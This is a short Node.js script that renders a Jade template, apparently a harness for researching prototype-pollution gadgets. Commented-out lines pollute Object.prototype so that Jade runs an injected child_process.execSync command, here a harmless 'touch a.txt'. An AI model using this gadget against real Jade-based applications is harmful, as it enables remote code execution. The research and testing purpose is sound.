var jade = require('jade');
const path = require('path');
const templatePath = path.join(__dirname, 'index.jade');


// Object.prototype.compileDebug = 1;
// Object.prototype.self = 1;
// Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"

// for node-find-undefined
console.log("="*20+"start"+"="*20+"\n")

jade.renderFile(templatePath);

// for node-find-undefined
console.log("="*20+"end"+"="*20+"\n")
